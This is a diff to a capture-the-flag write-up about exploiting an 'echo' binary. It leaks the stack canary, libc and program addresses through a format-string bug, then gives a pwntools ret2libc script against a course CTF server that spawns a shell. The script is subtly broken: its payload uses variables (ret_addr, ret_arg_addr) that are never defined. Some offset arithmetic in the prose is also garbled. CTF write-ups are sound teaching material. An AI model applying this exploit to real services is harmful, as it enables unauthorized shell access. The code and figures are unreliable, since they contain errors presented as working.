@@ -115,13 +115,13 @@ To overwrite the return address of `main`, we will need to exploit the buffer ov
 
 In order to leak the canary, we will need to read values from the stack. As such, the most suitable spot to do it is in the name field, with the help of a format string vulnerability.
 
-With the help of gef, a popular gdb plugin, we can see the value of the stack canary for a given process. Then we can search the stack at the point `fgets` for the name field is called and determine the offset at which the canary is located.
+With the help of gef, a popular gdb plugin, we can see the value of the stack canary for a given process. Then we can search the stack at the point `printf` for the name field is called and determine the offset at which the canary is located.
 
 ![The canary in the stack](/images/echo/canary-leak/1.png)
 
 > Note: in GEF, `telescope` is an alias for `dereference`
 
-As we can see, the canary for this process is `0x8cdeb100` and it is located at an offset of `+0x0028`. Therefore, since `28 / 4 = 7`, using `%8$x` (`7 + 1`, because grows "downwards") should be enough to leak the stack canary.
+As we can see, the canary for this process is `0x8cdeb100` and it is located at an offset of `+0x0020`. Therefore, since `0x0020 / 4 = 32 / 4 = 8`, using `%8$x` should be enough to leak the stack canary.
 We can test this by executing the program and, later, attaching gdb to it to check if the stack canary is correct or not.
 
 > To attach gdb to a running program, we used the command
@@ -150,6 +150,85 @@ Therefore, in our debug session, the address of `system` will be `0xf7d8b000 + 0
 
 However, since PIE is enabled, the use of the address `0xf7d8b000` is not reliable. Instead, we need to find a libc address on the stack, so that we can, from there, calculate the base address of libc. To that end, we can exploit the fact that the `main` function returns to a libc address.
 
+![Stack with the return address of main](/images/echo/canary-leak/1.png)
 
+Looking at the image from earlier, we can see that, at the point `printf` for the name field is called, the return address of `main` is located one address after `$ebp`, at an offset of `0x+0x002c = 44`, therefore, using the format string `%11$x` should be enough to leak that address. Since we know libc's base address in this session is `0xf7d8b000`, we can calculate the offset to subtract to the leaked address to be `0xf7dac519 - 0xf7d8b000 = 0x00021519`.
+
+Now that we can determine the address of the `system` function, we need to get the address of `buffer`, so that we can use it as an argument to the call.
+
+The `buffer` variable is located in the program's address space. As such, we need to leak the base address of program's address space, similarly to what we did with libc.
+Using the same image of the stack from before, we can see that, the address of `main` is located at offset `+0x0044` (68 in decimal). Therefore, in order to leak it, the format string `%17$x` can be used. After that, we can subtract the start address of program's address space in this debug session from it to get the offset that we need to subtract to the address leaked in the attack.
+As such, the offset is `0x565562ad - 0x56555000 = 0x000012AD`
+
+With all this information, we are now fully prepared to overwrite the return address and to write the arguments to the `system` function call.
+
+This is the stack at the point the `fgets` for the name field is called.
+
+![Stack when fgets is called](/images/echo/rop/stack-fgets.png)
+
+As you can see, the address where the input will be written to in this process is `0xffffc99c`. Therefore, if we dump the stack at that address, we can see that we will have to, at `0x20 = 32 bytes`, overwrite the return address and, at `0x24 = 36 bytes`, overwrite the argument for the `system` function call. In the middle, at `0x14 = 20 bytes`, we will have to write the canary so that it doesn't change (the canary has changed because we had to restart the session, however, that has no impact in this section).
 
 ## Exploitation
+
+Recalling all information we gathered during the Recon phase, we've developed the following exploit.
+
+```py
+from pwn import *
+
+def leak_canary(proc):
+    """Returns the canary of the process as a 32-bit integer."""
+    payload = b"%8$x"
+    proc.sendlineafter(b">", b"e")
+    proc.sendlineafter(b":", payload)
+    canary = proc.recvline(keepends=False)
+    proc.sendlineafter(b":", b"")
+    return int(canary, 16)
+
+def leak_main_addr(proc):
+    """Returns the address of main as a 32-bit integer."""
+    payload = b"%17$x"
+    proc.sendlineafter(b">", b"e")
+    proc.sendlineafter(b":", payload)
+    addr = proc.recvline(keepends=False)
+    proc.sendlineafter(b":", b"")
+    return int(addr, 16)
+
+def leak_libc_addr(proc):
+    """Returns the base address of libc as a 32-bit integer."""
+    payload = b"%11$x"
+    proc.sendlineafter(b">", b"e")
+    proc.sendlineafter(b":", payload)
+    addr = proc.recvline(keepends=False)
+    proc.sendlineafter(b":", b"")
+    return int(addr, 16)
+    
+r = remote("ctf-fsi.fe.up.pt", 4002)
+
+
+canary = leak_canary(r)
+info(f"Canary leaked!\n! {hex(canary)}")
+
+main_addr = leak_main_addr(r)
+program_base_addr = main_addr - 0x000012AD
+info(f"Program base address leaked!\n! {hex(program_base_addr)}")
+buffer_addr = program_base_addr + 0x00004040
+
+libc_addr = leak_libc_addr(r)
+libc_base_addr = libc_addr - 0x00021519
+info(f"Libc base address leaked!\n! {hex(libc_base_addr)}")
+system_addr = libc_base_addr + 0x00048150
+
+info(f"Ret addr: {hex(system_addr)}")
+info(f"Ret arg addr: {hex(buffer_addr)}")
+payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(ret_addr) + b"\0" * 4 + p32(ret_arg_addr)
+info(f"Payload: {payload}")
+
+r.sendlineafter(b">", b"e")
+r.sendlineafter(b":", payload)
+r.sendlineafter(b":", b"/bin/sh\0")
+
+r.interactive()
+```
+
+After having executing the script, an interactive shell on the machine will be available.
+Then, just execute `cat flag.txt` to get the flag!
